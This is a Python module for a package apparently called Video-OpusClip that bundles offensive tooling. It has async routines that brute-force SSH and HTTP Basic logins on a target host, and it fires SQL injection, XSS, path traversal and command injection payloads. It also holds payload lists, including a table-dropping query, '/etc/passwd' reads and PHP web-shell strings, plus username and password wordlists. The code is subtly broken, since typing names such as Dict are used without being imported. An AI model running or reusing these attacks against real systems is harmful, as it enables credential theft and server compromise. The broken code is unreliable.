"""
Attackers Module for Video-OpusClip
Offensive security testing and exploitation tools
"""

from .brute_forcers import (
    BruteForcer, BruteForceConfig, BruteForceManager,
    PasswordGenerator, AttackType, AttackStatus,
    Credential, AttackResult
)
from .exploiters import (
    Exploiter, ExploitConfig, ExploitManager,
    ExploitType, ExploitStatus, ExploitResult
)

__all__ = [
    # Brute Forcers
    'BruteForcer',
    'BruteForceConfig',
    'BruteForceManager',
    'PasswordGenerator',
    'AttackType',
    'AttackStatus',
    'Credential',
    'AttackResult',
    
    # Exploiters
    'Exploiter',
    'ExploitConfig',
    'ExploitManager',
    'ExploitType',
    'ExploitStatus',
    'ExploitResult'
]

# Example usage
async def run_comprehensive_attack(target_host: str, target_domain: str) -> Dict[str, Any]:
    """
    Run comprehensive attack including brute force and exploitation
    
    Args:
        target_host: Host to attack
        target_domain: Domain for additional context
        
    Returns:
        Dictionary containing all attack results
    """
    results = {}
    
    # Brute force attacks
    print("🔓 Running brute force attacks...")
    brute_results = await run_brute_force_attacks(target_host)
    results["brute_force"] = brute_results
    
    # Exploitation attacks
    print("💥 Running exploitation attacks...")
    exploit_results = await run_exploitation_attacks(target_host)
    results["exploitation"] = exploit_results
    
    return results

async def run_brute_force_attacks(target_host: str) -> Dict[str, Any]:
    """Run comprehensive brute force attacks"""
    # Create password generator
    password_gen = PasswordGenerator()
    common_passwords = password_gen.generate_common_passwords()
    username_variations = password_gen.generate_username_variations("admin")
    
    # Create brute force manager
    manager = BruteForceManager()
    
    # SSH attack
    ssh_config = BruteForceConfig(
        target=target_host,
        port=22,
        attack_type=AttackType.SSH_PASSWORD,
        usernames=username_variations[:5],  # Limit for demo
        passwords=common_passwords[:10],    # Limit for demo
        max_concurrent=5,
        timeout=10.0,
        delay=0.5,
        stop_on_success=True
    )
    manager.add_attack(ssh_config)
    
    # HTTP Basic attack
    http_config = BruteForceConfig(
        target=target_host,
        port=80,
        attack_type=AttackType.HTTP_BASIC,
        usernames=["admin", "user", "guest"],
        passwords=common_passwords[:5],  # Limit for demo
        max_concurrent=3,
        timeout=10.0,
        delay=0.2
    )
    manager.add_attack(http_config)
    
    # Run attacks
    results = await manager.run_all_attacks()
    
    return {
        "total_attacks": len(results),
        "successful_attacks": len([r for r in results if r.credentials_found]),
        "total_credentials": len(manager.get_successful_credentials()),
        "results": results,
        "report": manager.generate_report()
    }

async def run_exploitation_attacks(target_host: str) -> Dict[str, Any]:
    """Run comprehensive exploitation attacks"""
    # Create exploit manager
    manager = ExploitManager()
    
    # SQL Injection exploit
    sql_config = ExploitConfig(
        target=target_host,
        port=80,
        exploit_type=ExploitType.SQL_INJECTION,
        payload="' OR '1'='1",
        timeout=10.0,
        post_data={"id": "1"}
    )
    manager.add_exploit(sql_config)
    
    # XSS exploit
    xss_config = ExploitConfig(
        target=target_host,
        port=80,
        exploit_type=ExploitType.XSS,
        payload="<script>alert('XSS')</script>",
        timeout=10.0,
        post_data={"comment": "test"}
    )
    manager.add_exploit(xss_config)
    
    # Path traversal exploit
    path_config = ExploitConfig(
        target=target_host,
        port=80,
        exploit_type=ExploitType.PATH_TRAVERSAL,
        payload="../../../etc/passwd",
        timeout=10.0
    )
    manager.add_exploit(path_config)
    
    # Command injection exploit
    cmd_config = ExploitConfig(
        target=target_host,
        port=80,
        exploit_type=ExploitType.COMMAND_INJECTION,
        payload="; ls -la",
        timeout=10.0,
        post_data={"cmd": "ping"}
    )
    manager.add_exploit(cmd_config)
    
    # Run exploits
    results = await manager.run_all_exploits()
    
    return {
        "total_exploits": len(results),
        "successful_exploits": len(manager.get_successful_exploits()),
        "results": results,
        "report": manager.generate_report()
    }

def generate_attack_report(attack_results: Dict[str, Any]) -> str:
    """
    Generate comprehensive attack report from all results
    
    Args:
        attack_results: Results from comprehensive attack
        
    Returns:
        Formatted attack report
    """
    report = "⚔️ COMPREHENSIVE ATTACK REPORT\n"
    report += "=" * 60 + "\n\n"
    
    # Brute force summary
    if "brute_force" in attack_results:
        brute_data = attack_results["brute_force"]
        report += f"🔓 BRUTE FORCE ATTACKS\n"
        report += f"Total Attacks: {brute_data['total_attacks']}\n"
        report += f"Successful Attacks: {brute_data['successful_attacks']}\n"
        report += f"Credentials Found: {brute_data['total_credentials']}\n\n"
        
        # List successful credentials
        if brute_data['total_credentials'] > 0:
            report += "Successful Credentials:\n"
            for result in brute_data['results']:
                if result.credentials_found:
                    for cred in result.credentials_found:
                        report += f"  • {cred.username}:{cred.password} ({cred.service})\n"
            report += "\n"
    
    # Exploitation summary
    if "exploitation" in attack_results:
        exploit_data = attack_results["exploitation"]
        report += f"💥 EXPLOITATION ATTACKS\n"
        report += f"Total Exploits: {exploit_data['total_exploits']}\n"
        report += f"Successful Exploits: {exploit_data['successful_exploits']}\n\n"
        
        # List successful exploits
        if exploit_data['successful_exploits'] > 0:
            report += "Successful Exploits:\n"
            for result in exploit_data['results']:
                if result.status == ExploitStatus.SUCCESS:
                    report += f"  • {result.exploit_type.value} on {result.target}\n"
                    if result.shell_access:
                        report += f"    Shell Access: YES\n"
                    if result.data_extracted:
                        report += f"    Data Extracted: YES\n"
            report += "\n"
    
    # Overall summary
    report += "📊 OVERALL SUMMARY\n"
    report += "-" * 30 + "\n"
    
    total_credentials = attack_results.get("brute_force", {}).get("total_credentials", 0)
    total_exploits = attack_results.get("exploitation", {}).get("successful_exploits", 0)
    
    report += f"Total Credentials Compromised: {total_credentials}\n"
    report += f"Total Exploits Successful: {total_exploits}\n"
    
    if total_credentials > 0 or total_exploits > 0:
        report += "🚨 CRITICAL SECURITY BREACHES DETECTED\n"
        report += "Immediate action required to secure the system\n"
    else:
        report += "✅ No successful attacks detected\n"
    
    report += "\n🔧 IMMEDIATE REMEDIATION STEPS\n"
    report += "-" * 35 + "\n"
    report += "1. Change all compromised credentials immediately\n"
    report += "2. Patch identified vulnerabilities\n"
    report += "3. Implement strong authentication mechanisms\n"
    report += "4. Enable intrusion detection systems\n"
    report += "5. Conduct security audit and penetration testing\n"
    report += "6. Implement network segmentation\n"
    report += "7. Enable logging and monitoring\n"
    
    return report

def analyze_attack_results(attack_results: Dict[str, Any]) -> Dict[str, Any]:
    """
    Analyze attack results for security insights
    
    Args:
        attack_results: Results from comprehensive attack
        
    Returns:
        Analysis results with security insights
    """
    analysis = {
        "security_score": 100,  # Start with perfect score
        "critical_issues": [],
        "high_issues": [],
        "medium_issues": [],
        "low_issues": [],
        "recommendations": []
    }
    
    # Brute force analysis
    if "brute_force" in attack_results:
        brute_data = attack_results["brute_force"]
        
        if brute_data["total_credentials"] > 0:
            analysis["critical_issues"].append(f"{brute_data['total_credentials']} credentials compromised")
            analysis["security_score"] -= 30
        
        if brute_data["successful_attacks"] > 0:
            analysis["high_issues"].append(f"{brute_data['successful_attacks']} brute force attacks successful")
            analysis["security_score"] -= 20
    
    # Exploitation analysis
    if "exploitation" in attack_results:
        exploit_data = attack_results["exploitation"]
        
        if exploit_data["successful_exploits"] > 0:
            analysis["critical_issues"].append(f"{exploit_data['successful_exploits']} exploits successful")
            analysis["security_score"] -= 40
        
        # Check for specific exploit types
        for result in exploit_data["results"]:
            if result.status == ExploitStatus.SUCCESS:
                if result.exploit_type == ExploitType.SQL_INJECTION:
                    analysis["critical_issues"].append("SQL injection vulnerability exploited")
                    analysis["security_score"] -= 15
                elif result.exploit_type == ExploitType.COMMAND_INJECTION:
                    analysis["critical_issues"].append("Command injection vulnerability exploited")
                    analysis["security_score"] -= 20
                elif result.exploit_type == ExploitType.XSS:
                    analysis["high_issues"].append("Cross-site scripting vulnerability exploited")
                    analysis["security_score"] -= 10
                elif result.exploit_type == ExploitType.PATH_TRAVERSAL:
                    analysis["high_issues"].append("Path traversal vulnerability exploited")
                    analysis["security_score"] -= 10
    
    # Generate recommendations based on findings
    if analysis["critical_issues"]:
        analysis["recommendations"].append("Immediate action required for critical security breaches")
    if analysis["high_issues"]:
        analysis["recommendations"].append("Address high-priority security vulnerabilities")
    if analysis["medium_issues"]:
        analysis["recommendations"].append("Review and secure medium-priority findings")
    
    # Ensure security score doesn't go below 0
    analysis["security_score"] = max(0, analysis["security_score"])
    
    return analysis

def create_attack_payloads() -> Dict[str, List[str]]:
    """
    Create common attack payloads for testing
    
    Returns:
        Dictionary of payloads by type
    """
    payloads = {
        "sql_injection": [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "admin'--",
            "1' AND '1'='1",
            "1' AND '1'='2"
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>"
        ],
        "command_injection": [
            "; ls -la",
            "| whoami",
            "&& id",
            "`whoami`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| netstat -an",
            "&& ps aux"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd"
        ],
        "file_inclusion": [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
            "expect://id",
            "input://<?php system($_GET['cmd']); ?>"
        ]
    }
    
    return payloads

def create_brute_force_wordlists() -> Dict[str, List[str]]:
    """
    Create common wordlists for brute force attacks
    
    Returns:
        Dictionary of wordlists by type
    """
    wordlists = {
        "usernames": [
            "admin", "administrator", "root", "user", "guest", "test",
            "demo", "ubuntu", "centos", "debian", "fedora", "pi",
            "vagrant", "docker", "jenkins", "git", "www-data", "nginx",
            "apache", "mysql", "postgres", "redis", "elasticsearch"
        ],
        "passwords": [
            "", "password", "123456", "123456789", "qwerty", "abc123",
            "password123", "admin", "admin123", "root", "root123",
            "user", "user123", "guest", "guest123", "test", "test123",
            "demo", "demo123", "welcome", "welcome123", "login", "login123",
            "pass", "pass123", "secret", "secret123", "private", "private123",
            "letmein", "letmein123", "changeme", "changeme123", "newpass", "newpass123"
        ],
        "common_services": [
            "ssh", "ftp", "telnet", "smtp", "pop3", "imap",
            "http", "https", "mysql", "postgresql", "redis", "mongodb"
        ]
    }
    
    return wordlists 